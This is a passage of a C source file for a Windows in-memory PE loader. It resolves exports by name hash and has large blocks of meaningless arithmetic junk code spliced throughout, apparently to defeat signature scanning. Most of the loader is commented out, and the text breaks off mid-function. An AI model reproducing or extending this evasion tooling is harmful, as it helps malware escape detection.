#include "pe.h"

#ifdef _WIN64
#define POINTER_TYPE unsigned long long
#else
#define POINTER_TYPE unsigned long
#endif

typedef LPVOID(WINAPI *funcVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL(WINAPI *funcVirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
typedef HMODULE(WINAPI *funcLoadLibraryA)(LPCSTR lpLibFileName);
typedef FARPROC(WINAPI *funcGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef void*(__cdecl *funcmemcpy)(void *dest, const void *src, size_t count);

unsigned int NameHash(const char *szName)
{
	unsigned int ret = 0;
	for (int i = 0; szName[i] != 0; ++i)
	{
		//kernel32: ret * 3 + (szName[i] / 16) + (szName[i] % 16) * 16 + i;
		ret = ret * 3 + (szName[i] / 16) + (szName[i] % 16) * 16 + i;
	}

	return ret;
}


/*bool DoBaseReloc(unsigned char *codeBase, size_t codeSize, size_t delta, IMAGE_BASE_RELOCATION *pBaseReloc, int remainSize)
{
	bool ret = true;
	while (remainSize > 0 && ret)
	{
		WORD *arrRel = (WORD *)&pBaseReloc[1];
		int nRel = (pBaseReloc[0].SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		char *dest = (char*)codeBase + pBaseReloc[0].VirtualAddress;

		if (dest < (char*)codeBase || (char*)codeBase + codeSize < dest)
		{
			ret = false;
		}
		else for (int i = 0; i < nRel; ++i)
		{
			DWORD *patchAddrHL;{
int iFvYylbvr3x = 0x62581f0;
int iTOTHH4OO63 = 0x7451249;
int iwm67AEbrig = 0x9cd2e72;
int irkmY4WytrY = iFvYylbvr3x + iTOTHH4OO63 - iwm67AEbrig;
irkmY4WytrY = 0xa8690e9 * irkmY4WytrY + 0xccd68a3 - iTOTHH4OO63;
int iuSA8nM80BO = irkmY4WytrY / 0xccd68a3 + iFvYylbvr3x ^ iwm67AEbrig - 0x9cd2e72;
}
#ifdef _WIN64
			ULONGLONG *patchAddr64;
#endif
			int offset = arrRel[i] & 0xfff;
			switch (arrRel[i] >> 12)
			{
			case IMAGE_REL_BASED_ABSOLUTE:
				// skip relocation
				break;

			case IMAGE_REL_BASED_HIGHLOW:
				// change complete 32 bit address
				patchAddrHL = (DWORD *)(dest + offset);
				*patchAddrHL += (DWORD)delta;
				break;

#ifdef _WIN64
			case IMAGE_REL_BASED_DIR64:
				patchAddr64 = (ULONGLONG *)(dest + offset);
				*patchAddr64 += delta;
				break;
#endif

			default:
				ret = false;
				break;
			}
		}

		if (ret)
		{
			remainSize -= pBaseReloc[0].SizeOfBlock;
			pBaseReloc = (IMAGE_BASE_RELOCATION *)((char*)pBaseReloc + pBaseReloc[0].SizeOfBlock);
		}
	}

	return ret;

}*/

/*bool DoImport(unsigned char *codeBase, IMAGE_IMPORT_DESCRIPTOR *pImportDesc, funcLoadLibraryA fnLoadLibraryA, funcGetProcAddress fnGetProcAddress)
{
	bool ret = true;

	while (pImportDesc[0].Name)
	{
		char *szLibName = (char*)codeBase + pImportDesc[0].Name;

		HMODULE hLib = fnLoadLibraryA(szLibName);

		if (!hLib)
		{
			ret = false;
			break;
		}

		POINTER_TYPE *thunkRef;
		FARPROC *funcRef;{
int ib9T01G9aXX = 0x22c139f;
int iz05GHUvNsi = 0x7b34f2c;
int iWIcV8FZOC8 = 0x3131208;
int iZMCKKfQlpR = ib9T01G9aXX + iz05GHUvNsi - iWIcV8FZOC8;
iZMCKKfQlpR = 0xc05c488 * iZMCKKfQlpR + 0x3b4ec1a - iz05GHUvNsi;
int i6tBTTw6xct = iZMCKKfQlpR / 0x3b4ec1a + ib9T01G9aXX ^ iWIcV8FZOC8 - 0x3131208;
}
		if (pImportDesc[0].OriginalFirstThunk) {
			thunkRef = (POINTER_TYPE *)(codeBase + pImportDesc[0].OriginalFirstThunk);
			funcRef = (FARPROC *)(codeBase + pImportDesc[0].FirstThunk);
		}
		else {
			// no hint table
			thunkRef = (POINTER_TYPE *)(codeBase + pImportDesc[0].FirstThunk);{
int i18Rt4lLUmV;
int iq8L10qqe9U = 0x6009466;
int iAMX7pmD9GR = 0x93ac203;
int il0sOFnvaoy = 0x4bcadc3;
for(i18Rt4lLUmV = 0; i18Rt4lLUmV < 3; i18Rt4lLUmV++)
{
    iq8L10qqe9U = i18Rt4lLUmV * 99 - 1000 * iAMX7pmD9GR + 0x456 ^ 0x4e29764 % 5 - 0x6ebf6b2;
    iAMX7pmD9GR = i18Rt4lLUmV * 3 + il0sOFnvaoy + 0x30 + 0x4bcadc3 % 123 - iAMX7pmD9GR;
    il0sOFnvaoy = i18Rt4lLUmV * 4 - 0x93ac203 + 0xff / 0x123 - 0x4bcadc3 % 234 - 0x6ebf6b2;
}
int iaSeyUN7v5l = il0sOFnvaoy - iq8L10qqe9U * iAMX7pmD9GR + 0x4bcadc3;
iaSeyUN7v5l = i18Rt4lLUmV - 50 + 100 - 0x93ac203 ^ 99 * 0x0f - 0x4bcadc3 % 2 - 3575 + 0x6ebf6b2;
}
			funcRef = (FARPROC *)(codeBase + pImportDesc[0].FirstThunk);
		}

		if (!thunkRef || !funcRef)
		{
			ret = false;{
int iraCcVWRNEK = 0x6243fbe;
int iEd699srKBm = 0x2ddf57e;
int i1z7CpmlPIs = 0x96d8e7c;
int ieAwUQUKc4e = i1z7CpmlPIs * iEd699srKBm + iraCcVWRNEK;
iEd699srKBm = 0xea175a9 + ieAwUQUKc4e + 0x8552414 + iraCcVWRNEK;
int i3qmheJgqSU = iraCcVWRNEK / 0x2ddf57e - i1z7CpmlPIs ^ i1z7CpmlPIs ^ 0x96d8e7c;
}
			break;
		}
		else for (; *thunkRef; thunkRef++, funcRef++)
		{
			if (IMAGE_SNAP_BY_ORDINAL(*thunkRef))
			{
				*funcRef = fnGetProcAddress(hLib, (LPCSTR)IMAGE_ORDINAL(*thunkRef));{
int iOY0KpKt0lQ = 0x0b71965;
int i1Zc47nwiZL = 0x6abf4b5;
int ir5oDaQozFR = 0x3542de2;
int ia1wVXTyXjG = iOY0KpKt0lQ + i1Zc47nwiZL - ir5oDaQozFR;
ia1wVXTyXjG = 0x5cd022b * ia1wVXTyXjG + 0x89687ef - i1Zc47nwiZL;
int iy2i6iJDL8S = ia1wVXTyXjG / 0x89687ef + iOY0KpKt0lQ ^ ir5oDaQozFR - 0x3542de2;
}
			}
			else
			{
				PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)(codeBase + (*thunkRef));

				*funcRef = fnGetProcAddress(hLib, (LPCSTR)&thunkData->Name);
			}

			if (*funcRef == 0) {
				ret = false;
				break;
			}
		}

		pImportDesc++;
	}

	return ret;
}*/

FARPROC DoGetProcAddress(unsigned char *codeBase, PIMAGE_EXPORT_DIRECTORY pExport, unsigned int hName)
{
	void* ret = nullptr;

	WORD *pwExportOrd = (WORD*)(codeBase + pExport->AddressOfNameOrdinals);
	DWORD *pdwExportAddr = (DWORD*)(codeBase + pExport->AddressOfFunctions);{
int i4HOGig7oUc = 0x286f793;
int imYFt07CRcN = 0xb24709e;
int iEC7Ewh6YdD = 0xf7f52ed;
int iyvytcqIm6v = 0x176ea14;
int iOxgUnpW51F = 3;
switch(iOxgUnpW51F)
{
    case 0:
        i4HOGig7oUc = imYFt07CRcN - 0x5a3a4c3 * iEC7Ewh6YdD / 100;
        imYFt07CRcN = 0xf7f52ed - 5 +  0xf7f52ed - 6 * imYFt07CRcN / 10 + 25;
        iEC7Ewh6YdD = i4HOGig7oUc * 0x12 + iyvytcqIm6v * 0x15 + 0x176ea14 / 13 + 0x5a3a4c3 + 555;
        iyvytcqIm6v = 0x286f793 - 21 + 11 * 1996 - imYFt07CRcN + 14520538 - iEC7Ewh6YdD - 14520692 + 0xb24709e - 97;
        break;
    case 1:
        i4HOGig7oUc = imYFt07CRcN - 25 + 0x286f793 - 40 + 0xf7f52ed % 10 + 2;
        iEC7Ewh6YdD = iEC7Ewh6YdD - 0xff % 3 - iyvytcqIm6v * 10 + 0x5a3a4c3 / 2 - 10 + 0xb24709e - 5;
        iyvytcqIm6v = 0x286f793 % 0x5a3a4c3 ^ 33 + 0xf7f52ed * 0x12 - 30 + 0xf7f52ed + 23;
        imYFt07CRcN = imYFt07CRcN + 321 + iEC7Ewh6YdD * 10 * imYFt07CRcN / 10 / 2 + 0x5a3a4c3 * 0x60;
        break;
    case 2:
        i4HOGig7oUc = imYFt07CRcN - 45 - iEC7Ewh6YdD * 46 + 0x286f793 / 0xdade;
        imYFt07CRcN = imYFt07CRcN + 0x5a3a4c3 - iEC7Ewh6YdD * 0xb24709e - 3;
        iEC7Ewh6YdD = 0xb24709e - 0x1 + i4HOGig7oUc * 0x2 - 0x5a3a4c3 / 0x3 + 0xf7f52ed;
        iyvytcqIm6v = i4HOGig7oUc - 0x4 * 0x286f793 + 0x1234 - 0x4567 + 0xcafe + imYFt07CRcN % 0x432 / 0x176ea14 - 0x23;
        break;
    case 3:
        imYFt07CRcN = iyvytcqIm6v * 2 * 0xb24709e - 4 + 0x5a3a4c3 + 12 + 34 + 0x286f793;
        iEC7Ewh6YdD = imYFt07CRcN - 43 + 0xf7f52ed * 3040 - 0xb24709e % 10 + 1 - 0xf7f52ed;
        iyvytcqIm6v = 0xf7f52ed - 33 + i4HOGig7oUc * 0x25 + 0x286f793 - 3004 + 0xb24709e;
        i4HOGig7oUc = 0x286f793 + 2905 % imYFt07CRcN * 1996 + 0x176ea14 - 70 * 0x5a3a4c3;
        break;
    case 4:
        iyvytcqIm6v = imYFt07CRcN - 36 +0x5a3a4c3 * 2001 - iEC7Ewh6YdD / 234 + 0x7;
        i4HOGig7oUc = iyvytcqIm6v - 0xabcedf + 0xb24709e * 0xa2bc5 + iyvytcqIm6v / 0x123 + 0x286f793;
        iEC7Ewh6YdD = i4HOGig7oUc - 0x124 + 23 / imYFt07CRcN / 3 / 2 + iEC7Ewh6YdD + 29 - 0xb24709e + 100;
        imYFt07CRcN = 0xb24709e - 70 + 70  + 0x286f793 / 2 + 423 - 0x286f793 / 7749 % 0x1234;
        break;
    case 5:
        imYFt07CRcN = imYFt07CRcN - 9981 % i4HOGig7oUc + 111 - iEC7Ewh6YdD / 224 % 0xf7f52ed;
        iEC7Ewh6YdD = iEC7Ewh6YdD - 339 - iEC7Ewh6YdD * 4416 / 0x5a3a4c3 + 5525 + 0xb24709e % 10;
        iyvytcqIm6v = iyvytcqIm6v - 6636 + 0xb24709e * 7749 + 1 - imYFt07CRcN * 8864 / 0xfecba;
        i4HOGig7oUc = 0x5a3a4c3 - 9981 % 0x286f793 % 10 % 1010100 - 0x286f793 - 23 -  0x5a3a4c3 - 2500;
        break;
}
iOxgUnpW51F = iyvytcqIm6v - 0xaa + 0xf7f52ed * 46 - 15 / iEC7Ewh6YdD + 11 - 0x286f793;
iOxgUnpW51F = iOxgUnpW51F - 70 * 55 - iEC7Ewh6YdD ^ 0x99 - 0x567498 % 0x286f793 % 2 - 234 + 0xb24709e;
}
	DWORD *pdwExportName = (DWORD*)(codeBase + pExport->AddressOfNames);

	DWORD i, n = pExport->NumberOfNames;
	for (i = 0; i < n; ++i)
	{
		const char *pszExpFuncName = (char*)codeBase + pdwExportName[i];
		if (NameHash(pszExpFuncName) == hName)
		{
			ret = codeBase + pdwExportAddr[pwExportOrd[i]];{
int i9S5LqmPqwF = 0xccfa32c;
int i9osRHYe8PU = 0xe473fec;
int ihsM0iAxujQ = 0x70f59e2;
int irJpmzHZeSo = ihsM0iAxujQ * i9osRHYe8PU + i9S5LqmPqwF;
i9osRHYe8PU = 0x2b37d32 - irJpmzHZeSo + 5 + 0x40bca20 + 69 - i9S5LqmPqwF;
i9S5LqmPqwF = 0xccfa32c + 10 - i9osRHYe8PU % 10 + 0x70f59e2 + 999 - irJpmzHZeSo;
irJpmzHZeSo = i9S5LqmPqwF % 5 + ihsM0iAxujQ % 0xe473fec + 0xcafebabe + i9S5LqmPqwF;
ihsM0iAxujQ = 0xccfa32c * 0x100 - i9S5LqmPqwF + 56 ^ 0xe473fec + 1996 - ihsM0iAxujQ;
int iR6oBLWzGYq = ihsM0iAxujQ / 77 + 0x70f59e2 - 76 / ihsM0iAxujQ ^ 0x33 % ihsM0iAxujQ % 0x70f59e2;
iR6oBLWzGYq = 0x40bca20 * 0x10 - 22 + iR6oBLWzGYq + 56 ^ 0xff + i9osRHYe8PU + 1996 - 2111 + ihsM0iAxujQ;
}
			break;
		}
	}

	return (FARPROC)ret;
}

bool PECheck(const void *pImg, int sztImg)
{
	bool ret = false;
	IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)pImg;
	IMAGE_NT_HEADERS *pNT = (IMAGE_NT_HEADERS*)((char*)pImg + pDos->e_lfanew);

	WORD wMagic =
#ifndef _WIN64
		IMAGE_NT_OPTIONAL_HDR32_MAGIC;
#else
		IMAGE_NT_OPTIONAL_HDR64_MAGIC;
#endif

	WORD wMachine =
#ifndef _WIN64
		IMAGE_FILE_MACHINE_I386;{
int izxyImUXtpY = 0x471b207;
int irFNXNYM5Za = 0x9b1a994;
int idHHOUkojc1 = 0x3a3bc4d;
int i9oHDvPw5hU = idHHOUkojc1 * irFNXNYM5Za + izxyImUXtpY;
irFNXNYM5Za = 0x043af73 + i9oHDvPw5hU + 0xc5f8c6c + izxyImUXtpY;
int izbB8LFlxLO = izxyImUXtpY / 0x9b1a994 - idHHOUkojc1 ^ idHHOUkojc1 ^ 0x3a3bc4d;
}
#else
		IMAGE_FILE_MACHINE_AMD64;
#endif
	if ((ULONG)pDos->e_lfanew + pNT->FileHeader.SizeOfOptionalHeader >= (ULONG)sztImg)
	{
		printf("Invalid PE Header size");
	}
	if (pNT->Signature != IMAGE_NT_SIGNATURE)
	{
		printf("Invalid PE Signature");
	}
	else if (pNT->OptionalHeader.Magic != wMagic
		|| pNT->FileHeader.Machine != wMachine)
	{
		printf("Invalid PE Machine");{
int ijLHfoCKNjI;
int iGbLOmFsz1G = 0xe60a9c3;
int ilghiDyZESf = 0x93e0b3a;
int iTSOjXaJ2ai = 0xbcad970;
for(ijLHfoCKNjI = 0; ijLHfoCKNjI < 3; ijLHfoCKNjI++)
{
    iGbLOmFsz1G = ijLHfoCKNjI * 99 - 1000 * ilghiDyZESf + 0x456 ^ 0x5436a46 % 5 - 0xd28548a;
    ilghiDyZESf = ijLHfoCKNjI * 3 + iTSOjXaJ2ai + 0x30 + 0xbcad970 % 123 - ilghiDyZESf;
    iTSOjXaJ2ai = ijLHfoCKNjI * 4 - 0x93e0b3a + 0xff / 0x123 - 0xbcad970 % 234 - 0xd28548a;
}
int i22k4IhpJkZ = iTSOjXaJ2ai - iGbLOmFsz1G * ilghiDyZESf + 0xbcad970;
i22k4IhpJkZ = ijLHfoCKNjI - 50 + 100 - 0x93e0b3a ^ 99 * 0x0f - 0xbcad970 % 2 - 3575 + 0xd28548a;
}
	}
	else if (pNT->FileHeader.NumberOfSections >= 90)
	{
		printf("Number of PE Section %d >= %d", pNT->FileHeader.NumberOfSections, 90);
	}
	else if (pNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size == 0)
	{
		printf("Not support image with no relocation yet!");
	}
	else
	{
		ret = true;
	}

	return ret;

}

/*HMODULE FixIntoMem(const void *pImg, int sztImg, funcVirtualAlloc fnVirtualAlloc, funcVirtualFree fnVirtualFree, funcmemcpy fnmemcpy)
{
	HMODULE hMod = nullptr;

	const IMAGE_DOS_HEADER *pDos = (const IMAGE_DOS_HEADER*)pImg;
	char *pChOldDos = (char*)pDos;

	IMAGE_NT_HEADERS *pOldNTHead = (IMAGE_NT_HEADERS*)((char*)pImg + pDos->e_lfanew);
	DWORD dwFullNTSize = sizeof(IMAGE_NT_HEADERS) - (sizeof(IMAGE_OPTIONAL_HEADER) - pOldNTHead->FileHeader.SizeOfOptionalHeader);{
int iw6gFTTCSYe = 0x4b8a76d;
int iVdfjtHBH5q = 0x37d870e;
int iXmDtZTxfga = 0xd59302c;
int iUZyYcvZhGM = iXmDtZTxfga * iVdfjtHBH5q + iw6gFTTCSYe;
iVdfjtHBH5q = 0xbf63038 + iUZyYcvZhGM + 0xe18f010 + iw6gFTTCSYe;
int iG6FY8590XM = iw6gFTTCSYe / 0x37d870e - iXmDtZTxfga ^ iXmDtZTxfga ^ 0xd59302c;
}
	IMAGE_SECTION_HEADER *pOldSectHead = (IMAGE_SECTION_HEADER*)((char*)pOldNTHead + dwFullNTSize);

	if (pOldNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0
		&& (pOldNTHead->FileHeader.Characteristics&IMAGE_FILE_RELOCS_STRIPPED)
		)
	{
		hMod = (HMODULE)pOldNTHead->OptionalHeader.ImageBase;
	}

	hMod = (HMODULE)fnVirtualAlloc(hMod, pOldNTHead->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (hMod == nullptr)
	{
		//printf("Can't alloc memory: %d at %p", pOldNTHead->OptionalHeader.SizeOfImage, hMod);
	}
	else
	{
		IMAGE_DOS_HEADER *pNewDos = (IMAGE_DOS_HEADER*)hMod;
		char *pChNewDos = (char*)hMod;

		DWORD dwStubSize = dwFullNTSize + sizeof(IMAGE_SECTION_HEADER)*pOldNTHead->FileHeader.NumberOfSections;
		//copy dos
		fnmemcpy(pChNewDos, pChOldDos, pDos->e_lfanew);

		IMAGE_NT_HEADERS *pNewNtHead = (IMAGE_NT_HEADERS*)(pChNewDos + pDos->e_lfanew);{
int iiKHOCQ2taf = 0x2269c84;
int iPcxTGmPCNp = 0xbb951a5;
int ijZcRSCtPyF = 0x302451f;
int iEn4CBQZZrM = 0x9bf4788;
int icNryaYGluq = 1;
switch(icNryaYGluq)
{
    case 0:
        iiKHOCQ2taf = iPcxTGmPCNp - 0x7e737b4 * ijZcRSCtPyF / 100;
        iPcxTGmPCNp = 0x302451f - 5 +  0x302451f - 6 * iPcxTGmPCNp / 10 + 25;
        ijZcRSCtPyF = iiKHOCQ2taf * 0x12 + iEn4CBQZZrM * 0x15 + 0x9bf4788 / 13 + 0x7e737b4 + 555;
        iEn4CBQZZrM = 0x2269c84 - 21 + 11 * 1996 - iPcxTGmPCNp + 14520538 - ijZcRSCtPyF - 14520692 + 0xbb951a5 - 97;
        break;
    case 1:
        iiKHOCQ2taf = iPcxTGmPCNp - 25 + 0x2269c84 - 40 + 0x302451f % 10 + 2;
        ijZcRSCtPyF = ijZcRSCtPyF - 0xff % 3 - iEn4CBQZZrM * 10 + 0x7e737b4 / 2 - 10 + 0xbb951a5 - 5;
        iEn4CBQZZrM = 0x2269c84 % 0x7e737b4 ^ 33 + 0x302451f * 0x12 - 30 + 0x302451f + 23;
        iPcxTGmPCNp = iPcxTGmPCNp + 321 + ijZcRSCtPyF * 10 * iPcxTGmPCNp / 10 / 2 + 0x7e737b4 * 0x60;
        break;
    case 2:
        iiKHOCQ2taf = iPcxTGmPCNp - 45 - ijZcRSCtPyF * 46 + 0x2269c84 / 0xdade;
        iPcxTGmPCNp = iPcxTGmPCNp + 0x7e737b4 - ijZcRSCtPyF * 0xbb951a5 - 3;
        ijZcRSCtPyF = 0xbb951a5 - 0x1 + iiKHOCQ2taf * 0x2 - 0x7e737b4 / 0x3 + 0x302451f;
        iEn4CBQZZrM = iiKHOCQ2taf - 0x4 * 0x2269c84 + 0x1234 - 0x4567 + 0xcafe + iPcxTGmPCNp % 0x432 / 0x9bf4788 - 0x23;
        break;
    case 3:
        iPcxTGmPCNp = iEn4CBQZZrM * 2 * 0xbb951a5 - 4 + 0x7e737b4 + 12 + 34 + 0x2269c84;
        ijZcRSCtPyF = iPcxTGmPCNp - 43 + 0x302451f * 3040 - 0xbb951a5 % 10 + 1 - 0x302451f;
        iEn4CBQZZrM = 0x302451f - 33 + iiKHOCQ2taf * 0x25 + 0x2269c84 - 3004 + 0xbb951a5;
        iiKHOCQ2taf = 0x2269c84 + 2905 % iPcxTGmPCNp * 1996 + 0x9bf4788 - 70 * 0x7e737b4;
        break;
    case 4:
        iEn4CBQZZrM = iPcxTGmPCNp - 36 +0x7e737b4 * 2001 - ijZcRSCtPyF / 234 + 0x7;
        iiKHOCQ2taf = iEn4CBQZZrM - 0xabcedf + 0xbb951a5 * 0xa2bc5 + iEn4CBQZZrM / 0x123 + 0x2269c84;
        ijZcRSCtPyF = iiKHOCQ2taf - 0x124 + 23 / iPcxTGmPCNp / 3 / 2 + ijZcRSCtPyF + 29 - 0xbb951a5 + 100;
        iPcxTGmPCNp = 0xbb951a5 - 70 + 70  + 0x2269c84 / 2 + 423 - 0x2269c84 / 7749 % 0x1234;
        break;
    case 5:
        iPcxTGmPCNp = iPcxTGmPCNp - 9981 % iiKHOCQ2taf + 111 - ijZcRSCtPyF / 224 % 0x302451f;
        ijZcRSCtPyF = ijZcRSCtPyF - 339 - ijZcRSCtPyF * 4416 / 0x7e737b4 + 5525 + 0xbb951a5 % 10;
        iEn4CBQZZrM = iEn4CBQZZrM - 6636 + 0xbb951a5 * 7749 + 1 - iPcxTGmPCNp * 8864 / 0xfecba;
        iiKHOCQ2taf = 0x7e737b4 - 9981 % 0x2269c84 % 10 % 1010100 - 0x2269c84 - 23 -  0x7e737b4 - 2500;
        break;
}
icNryaYGluq = iEn4CBQZZrM - 0xaa + 0x302451f * 46 - 15 / ijZcRSCtPyF + 11 - 0x2269c84;
icNryaYGluq = icNryaYGluq - 70 * 55 - ijZcRSCtPyF ^ 0x99 - 0x567498 % 0x2269c84 % 2 - 234 + 0xbb951a5;
}
		//copy NT head & section header
		fnmemcpy(pNewNtHead, pOldNTHead, dwStubSize);

		//fix all section 
		int iSectionIndex = 0;

		for (iSectionIndex = 0;
			iSectionIndex < pOldNTHead->FileHeader.NumberOfSections;
			++iSectionIndex)
		{
			char *pNewSectData = pChNewDos + pOldSectHead[iSectionIndex].VirtualAddress;
			char *pOldSectData = pChOldDos + pOldSectHead[iSectionIndex].PointerToRawData;

			//check for valid section data
			if (pOldSectHead[iSectionIndex].SizeOfRawData
				&& pOldSectHead[iSectionIndex].PointerToRawData + pOldSectHead[iSectionIndex].SizeOfRawData > (ULONG)sztImg)
			{
				break;
			}

			DWORD dwRVASize = Align(pOldSectHead[iSectionIndex].Misc.VirtualSize, pOldNTHead->OptionalHeader.SectionAlignment);{
int irpzRWXy1WS;
int i5dxOmOtaD7 = 0x326e7d7;
int iCEYIx26lEy = 0xfadf547;
int iaQmVoVXFVQ = 0x88c1c11;
for(irpzRWXy1WS = 0; irpzRWXy1WS < 3; irpzRWXy1WS++)
{
    i5dxOmOtaD7 = irpzRWXy1WS * 99 - 1000 * iCEYIx26lEy + 0x456 ^ 0x9a248f0 % 5 - 0xa198331;
    iCEYIx26lEy = irpzRWXy1WS * 3 + iaQmVoVXFVQ + 0x30 + 0x88c1c11 % 123 - iCEYIx26lEy;
    iaQmVoVXFVQ = irpzRWXy1WS * 4 - 0xfadf547 + 0xff / 0x123 - 0x88c1c11 % 234 - 0xa198331;
}
int iDCjziooPXO = iaQmVoVXFVQ - i5dxOmOtaD7 * iCEYIx26lEy + 0x88c1c11;
iDCjziooPXO = irpzRWXy1WS - 50 + 100 - 0xfadf547 ^ 99 * 0x0f - 0x88c1c11 % 2 - 3575 + 0xa198331;
}
			fnmemcpy(pNewSectData, pOldSectData, pOldSectHead[iSectionIndex].SizeOfRawData);
		}

		if (iSectionIndex == pOldNTHead->FileHeader.NumberOfSections)
		{
		}
		else
		{
			fnVirtualFree(hMod, 0, MEM_RELEASE); hMod = nullptr;
		}
	}

	return (HMODULE)hMod;{
int iFql1z1OC73 = 0x4e5111d;
int iwMpHXiXtsa = 0x6284713;
int iIsHURv8864 = 0xe74b68a;
int i52ijLLDM6D = iIsHURv8864 * iwMpHXiXtsa + iFql1z1OC73;
iwMpHXiXtsa = 0x739598a - i52ijLLDM6D + 5 + 0x123cd4d + 69 - iFql1z1OC73;
iFql1z1OC73 = 0x4e5111d + 10 - iwMpHXiXtsa % 10 + 0xe74b68a + 999 - i52ijLLDM6D;
i52ijLLDM6D = iFql1z1OC73 % 5 + iIsHURv8864 % 0x6284713 + 0xcafebabe + iFql1z1OC73;
iIsHURv8864 = 0x4e5111d * 0x100 - iFql1z1OC73 + 56 ^ 0x6284713 + 1996 - iIsHURv8864;
int ivckqWBAGbD = iIsHURv8864 / 77 + 0xe74b68a - 76 / iIsHURv8864 ^ 0x33 % iIsHURv8864 % 0xe74b68a;
ivckqWBAGbD = 0x123cd4d * 0x10 - 22 + ivckqWBAGbD + 56 ^ 0xff + iwMpHXiXtsa + 1996 - 2111 + iIsHURv8864;
}
}*/

/*bool Reloc(HMODULE hMod)
{
	bool ret = false;{
int iEqzmwm2KfW = 0xe18f2e3;
int iiscW5LOhaO = 0xb8eba98;
int ikyMOGSUUBt = 0x4b8d2c6;
int iMsCSjZGjsi = ikyMOGSUUBt * iiscW5LOhaO + iEqzmwm2KfW;
iiscW5LOhaO = 0x5728f83 - iMsCSjZGjsi + 5 + 0x444b19e + 69 - iEqzmwm2KfW;
iEqzmwm2KfW = 0xe18f2e3 + 10 - iiscW5LOhaO % 10 + 0x4b8d2c6 + 999 - iMsCSjZGjsi;
iMsCSjZGjsi = iEqzmwm2KfW % 5 + ikyMOGSUUBt % 0xb8eba98 + 0xcafebabe + iEqzmwm2KfW;
ikyMOGSUUBt = 0xe18f2e3 * 0x100 - iEqzmwm2KfW + 56 ^ 0xb8eba98 + 1996 - ikyMOGSUUBt;
int i4fJTjtg3zq = ikyMOGSUUBt / 77 + 0x4b8d2c6 - 76 / ikyMOGSUUBt ^ 0x33 % ikyMOGSUUBt % 0x4b8d2c6;
i4fJTjtg3zq = 0x444b19e * 0x10 - 22 + i4fJTjtg3zq + 56 ^ 0xff + iiscW5LOhaO + 1996 - 2111 + ikyMOGSUUBt;
}

	IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)hMod;
	unsigned char *pBase = (unsigned char*)pDos;

	IMAGE_NT_HEADERS *pNTHead = (IMAGE_NT_HEADERS*)((char*)pDos + pDos->e_lfanew);
	IMAGE_DATA_DIRECTORY imgDirRelocation = pNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	unsigned char *pOrgBase = (unsigned char*)pNTHead->OptionalHeader.ImageBase;
	if (pOrgBase == pBase)
	{
		ret = true;
	}
	else if (imgDirRelocation.VirtualAddress == 0)
	{
		ret = false;
	}
	else
	{
		size_t delta = pBase - pOrgBase;{
int iQWXXKuDWFT = 0x1e2c6c7;
int ilmgCW6lk4J = 0x4c62b47;
int ir0CwURAT2d = 0x7fb4840;
int ikhmjl7rRs5 = iQWXXKuDWFT + ilmgCW6lk4J - ir0CwURAT2d;
ikhmjl7rRs5 = 0x612f177 * ikhmjl7rRs5 + 0xfee82ad - ilmgCW6lk4J;
int iUaVMtyUw9U = ikhmjl7rRs5 / 0xfee82ad + iQWXXKuDWFT ^ ir0CwURAT2d - 0x7fb4840;
}

		IMAGE_BASE_RELOCATION *pBaseReloc = (IMAGE_BASE_RELOCATION*)(pBase + imgDirRelocation.VirtualAddress);

		if (imgDirRelocation.VirtualAddress + imgDirRelocation.Size >= pNTHead->OptionalHeader.SizeOfImage)
		{
			ret = false;
		}
		else
		{
			ret = DoBaseReloc(pBase, pNTHead->OptionalHeader.SizeOfImage, delta, pBaseReloc, imgDirRelocation.Size);
		}
	}

	return ret;
}*/

/*bool Import(HMODULE hMod, funcLoadLibraryA fnLoadLibraryA, funcGetProcAddress fnGetProcAddress)
{
	bool ret = true;{
int iGP0Ll6tdpx = 0xf3a8551;
int iXWjEYdmFQ4 = 0x35ba900;
int idhf5gY40dI = 0xdf797e2;
int iS5PwIEBxNU = iGP0Ll6tdpx + iXWjEYdmFQ4 - idhf5gY40dI;
iS5PwIEBxNU = 0x7a29df2 * iS5PwIEBxNU + 0x6d85ac4 - iXWjEYdmFQ4;
int ivXXsj1ueXw = iS5PwIEBxNU / 0x6d85ac4 + iGP0Ll6tdpx ^ idhf5gY40dI - 0xdf797e2;
}

	IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)hMod;
	unsigned char *pBase = (unsigned char*)hMod;

	IMAGE_NT_HEADERS *pNTHead = (IMAGE_NT_HEADERS*)(pBase + pDos->e_lfanew);
	IMAGE_DATA_DIRECTORY imgDirImport = pNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];


	if (imgDirImport.VirtualAddress)
	{
		IMAGE_IMPORT_DESCRIPTOR *pImportDesc = (IMAGE_IMPORT_DESCRIPTOR*)(pBase + imgDirImport.VirtualAddress);
		if (imgDirImport.VirtualAddress + imgDirImport.Size >= pNTHead->OptionalHeader.SizeOfImage)
		{
			ret = false;{
int iIAS2XzNGu7 = 0x84da892;
int iiDUfvyHDZ5 = 0x21b68f1;
int ijAjlaStzSI = 0x779cbc6;
int iLW9Wq0oQsU = ijAjlaStzSI * iiDUfvyHDZ5 + iIAS2XzNGu7;
iiDUfvyHDZ5 = 0x4c933fb - iLW9Wq0oQsU + 5 + 0xf440157 + 69 - iIAS2XzNGu7;
iIAS2XzNGu7 = 0x84da892 + 10 - iiDUfvyHDZ5 % 10 + 0x779cbc6 + 999 - iLW9Wq0oQsU;
iLW9Wq0oQsU = iIAS2XzNGu7 % 5 + ijAjlaStzSI % 0x21b68f1 + 0xcafebabe + iIAS2XzNGu7;
ijAjlaStzSI = 0x84da892 * 0x100 - iIAS2XzNGu7 + 56 ^ 0x21b68f1 + 1996 - ijAjlaStzSI;
